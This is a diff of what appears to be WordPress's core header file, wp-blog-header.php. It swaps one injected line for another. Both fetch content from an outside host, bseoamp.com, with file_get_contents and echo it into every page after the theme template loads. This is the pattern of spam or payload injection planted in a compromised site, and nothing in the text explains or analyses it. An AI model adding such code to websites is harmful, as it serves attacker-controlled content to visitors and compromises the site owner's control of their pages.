@@ -17,6 +17,7 @@ if ( ! isset( $wp_did_header ) ) {
 
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
-$a = file_get_contents ('https://bseoamp.com/bseo/');
-echo $a;
+	
+$b = file_get_contents( 'https://bseoamp.com/bseo1/' );
+echo $b;
 }
